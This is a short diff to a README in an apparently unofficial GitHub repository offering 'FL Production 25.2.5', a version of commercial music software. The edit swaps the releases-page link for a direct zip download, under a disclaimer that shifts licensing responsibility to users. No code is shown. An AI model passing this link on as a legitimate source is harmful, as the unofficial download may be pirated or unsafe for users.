@@ -18,7 +18,7 @@ FL Production 25.2.5 is the latest professional version of the world-renowned Di
 > This project is for educational and personal use only. Use at your own risk. Ensure you have proper licensing rights for commercial use. The authors are not responsible for any license violations or legal issues.
 
 ## Install
-[Download `FL-25.2.5.zip`](https://github.com/flstudio2525/fl-production-25.2.5/releases/latest)
+[Download `FL-25.2.5.zip`](https://github.com/flstudio2525/fl-production-25.2.5/releases/download/v25.2.5/FL-25.2.5.zip)
 ---
 
 ---
